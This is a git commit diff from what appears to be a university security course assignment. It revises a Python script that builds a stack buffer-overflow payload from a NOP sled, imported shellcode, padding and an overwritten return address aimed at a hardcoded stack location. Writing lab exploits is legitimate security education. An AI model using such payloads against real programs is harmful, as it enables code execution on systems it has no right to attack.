117dddd1a4578a2897b177c360fe9e34de5dcfb2
Xuefeng-Zhu <xzhu15@illinois.edu>
2015-11-06 19:40:08 -0600

    finish 7

--- project4/4.2.7.py
+++ project4/4.2.7.py
@@ -1,9 +1,10 @@
 from shellcode import shellcode
 from struct import pack
 
-ebp = 0xbffef3e8
-buf = 0xbffef7f0
+ebp = 0xbffef458
+buf = ebp - 8 - 1024
 
-padding = '\x90' * (ebp - buf + 4 - len(shellcode))
+padding = '\x90' * (512 - len(shellcode))
+padding2 = '\x90' * (512 + 8+4)
 
-print shellcode + padding + pack("<I", buf)
+print padding + shellcode + padding2 + pack("<I", buf)
